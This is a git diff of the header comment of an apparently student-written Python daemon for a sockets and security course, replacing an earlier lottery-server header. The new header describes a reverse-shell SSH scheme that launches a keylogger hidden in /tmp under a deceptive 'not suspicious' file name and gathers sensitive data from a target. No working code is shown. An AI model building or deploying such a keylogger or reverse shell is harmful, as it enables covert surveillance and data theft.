@@ -1,52 +1,54 @@
 #!/usr/bin/python3
 
-# ==============================================================================
-#   Assignment:  MILESTONE 3
-#
-#       Author:  Sang Min Park
-#     Language:  Python | Libraries: socket, json, os, errno, argparse,
-#                                    lotteryGenerator, signal, sys, atexit,
-#                                    logzero
-#   To Compile:  N/A
-#
-#        Class:  DPI912
-#    Professor:  Harvey Kaduri
-#     Due Date:  Sunday, November 03, 2019
-#    Submitted:  Sunday, November 03, 2019
-#
-# -----------------------------------------------------------------------------
-#
-#  Description:  Multi-processing program creates a well-behaving daemon process that listens to
-#                   incoming client connection. Once connection has been successfully
-#                   accepted, child process is forked off to handle their lottery ticket requests.
-#                   The daemon process is killed when the use runs the program
-#                   with "-status stop" command.
-#
-#
-#
-#        Input:  Program takes command line arguments for port number, IPv6 address,
-#                   and status command.
-#
-#       Output:  The program will write all server logs into a logfile located
-#                   in the /tmp directory. The file name will be the name of the client
-#                   and the pid for its file extension.
-#
-#    Algorithm:  The program will create daemon with a non-blocking listening socket for the server.
-#                   Pidfile is created and stores pid of the daemon process. It is later access by
-#                   the program to kill the daemon process when "-status stop" command is issued.
-#                   Once the socket accepts a connection, a child process will be forked
-#                   to handle all requests sent by the client. Before handling the requests,
-#                   the child processes need to close their listening socket.
-#                   The program uses lotteryGenerator script file to provide
-#                   appropriate lottery tickets requested by the client.
-#                   The parent process will go on to close the connection socket and loop back
-#                   to listen to other incoming connections.
-#
-#   Required Features Not Included:  N/A
-#
-#   Known Bugs:  N/A
-#
-# ==============================================================================
+#==============================================================================
+ #      Assignment:  DPI912 Term Project
+ #      File: SSH Client
+ #
+ #      Authors: Sang Min Park, Jacky Tea
+ #      Student ID (Sang Min Park): 124218173
+ #      Student ID (Jacky Tea): 152078168
+ #      Language: Python3
+ #      Libraries Used: paramiko, socket, os, time, logzero,
+ #      threading, subprocess, sys, atexit, signal
+ #
+ #      To compile with python3 >>> python3 sshDaemon.py -status start
+ #      To compile with executable >>> chmod 700 sshDaemon.py 
+ #                                 >>> ./sshDaemon.py -status start
+ #
+ #      Class: DPI912 NSB - Python for Programmers: Sockets and Security 
+ #      Professor: Professor Harvey Kaduri
+ #      Due Date: Friday, December 6, 2019, 5:50 PM EST
+ #      Submitted:  
+ #
+ #-----------------------------------------------------------------------------
+ #
+ #      Cookbook code utilized from the following source:
+ #      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
+ #
+ #      Description: A daemonized SSH server that runs in the background and sends commands
+ #      for an awaiting client over SSH to execute via a reverse-shell scheme.
+ #
+ #      Input:  A command line argument of either '-status start' or '-status stop'. For example:
+ #      ./sshDaemon.py -status start. '-status start' will execute the key logger, ' -status stop' will 
+ #      kill its background process.
+ #
+ #      Output: A file called in 'sshDaemon.log' in the current directory containing
+ #      error messages and information such as received messages over the SSH connection.
+ #      A file called ZZZZ_NOT_SUSPICIOUS_FILE is generated in /tmp which holds the keylogger
+ #      program. A file called '/tmp/sshDaemon.pid' is generated to keep track of the running process.
+ #
+ #      Algorithm: Once a status is received, the daemon checks if there is the existence
+ #      of a pid file to see if the daemon instance is already running. If there is one, an
+ #      error is thrown, else the daemonization process of double forking and flushing stdin,
+ #      stdout, stderr and keeping track of the current pid before terminal control is relinquished 
+ #      is done. Command are sent via SSH in the background to a SSH client to execute and gather
+ #      sensitive data from the target end.
+ #
+ #      Required Features Not Included:  
+ #
+ #      Known Bugs:  
+ #
+#==============================================================================
 
 import os
 import errno
@@ -353,11 +355,11 @@ if __name__ == '__main__':
     # Parse command line arguments
     commandArgs = parseCmdArgument()
 
-    if os.path.exists("/home/lab/bin/py/project/sshDaemon.log"):
-        os.remove("/home/lab/bin/py/project/sshDaemon.log")
+    if os.path.exists("sshDaemon.log"):
+        os.remove("sshDaemon.log")
 
     # Add logging to logfile and disable output to the terminal
-    logzero.logfile("/home/lab/bin/py/project/sshDaemon.log", maxBytes=1e6,
+    logzero.logfile("sshDaemon.log", maxBytes=1e6,
                     backupCount=3, disableStderrLogger=True)
 
     # Start server process
